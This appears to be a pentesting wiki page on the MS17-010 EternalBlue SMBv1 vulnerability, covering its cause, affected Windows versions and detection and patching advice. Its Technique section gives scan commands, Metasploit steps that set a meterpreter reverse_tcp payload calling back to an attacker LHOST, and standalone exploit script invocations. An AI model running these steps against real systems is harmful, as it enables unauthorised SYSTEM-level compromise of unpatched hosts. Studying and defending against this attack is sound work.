---
title: MS17-010 EternalBlue
slug: ms17-010-eternalblue
---

> **TL;DR:** A type-conversion bug in SMBv1's extended-attribute parser (`SrvOs2FeaListSizeToNt`) gives unauthenticated kernel-mode RCE on pre-patch Windows; weaponised by NSA's EternalBlue and DOUBLEPULSAR, then by WannaCry and NotPetya.

## What it is
MS17-010 (CVE-2017-0144) is a wrong-cast / size-miscalculation bug in `srv.sys` when converting OS/2 FEA (File Extended Attributes) lists into NT FEA structures. The conversion under-allocates a non-paged kernel pool buffer while copying attacker-controlled length, producing a pool overflow. Equation Group's EternalBlue exploit grooms the SMBv1 transaction pool, overflows into a controlled SMB structure, and installs the DOUBLEPULSAR ring-0 backdoor for follow-on payloads. Variant exploits in the same advisory (EternalRomance, EternalSynergy, EternalChampion) target related code paths.

## Preconditions / where it applies
- Windows Vista/7/8.1/10 pre-1703, Server 2008/2008R2/2012/2012R2/2016 without KB4013389
- SMBv1 enabled and TCP 445 reachable
- Non-paged pool layout predictable (no `CONFIG_HVCI` style mitigations on era hardware)
- Target must respond to `Trans2 SESSION_SETUP` — null session sufficient on most stock builds

## Technique
```bash
# Triage: is SMBv1 up and is the host vulnerable?
nmap -p 445 --script smb-protocols,smb-vuln-ms17-010 10.10.10.40

# Quick check with smbclient
smbclient -L //10.10.10.40 -N --option='client min protocol=NT1'
```

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.40
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.2
msf6 > set VERIFY_TARGET true
msf6 > exploit
# DOUBLEPULSAR check + grooming + kernel RCE -> SYSTEM session
```

```python
# Standalone (worawit/MS17-010 fork) for tricky targets
python3 zzz_exploit.py 10.10.10.40 spoolsv      # service-aware variant
python3 eternalblue_exploit7.py 10.10.10.40 sc_x64.bin
```

EternalRomance/Synergy target the same FEA path through `Transaction` and `WriteAndX` requests and are preferred against Windows 2003 / XP where EternalBlue groom is unreliable.

## Detection and defence
- Patch: KB4013389 (MS17-010), and disable SMBv1 entirely (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`)
- Snort SID 1:42944 / Suricata `SMB Possible ETERNALBLUE MS17-010 echo response`
- EDR: SMB session from external host followed by `lsass.exe` injection or `rundll32` with no commandline
- Hunt for DOUBLEPULSAR via `Trans2 SESSION_SETUP` with multiplex-id 81/82 magic values

## References
- [MSRC MS17-010 advisory](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) — vendor bulletin
- [Countercept EternalBlue analysis](https://research.nccgroup.com/2017/04/20/equation-group-exploit-analysis-eternalblue/) — root-cause writeup

See also: [[smb-enum]], [[smb-exec]], [[ms08-067-netapi]], [[heap-exploitation-linux]].
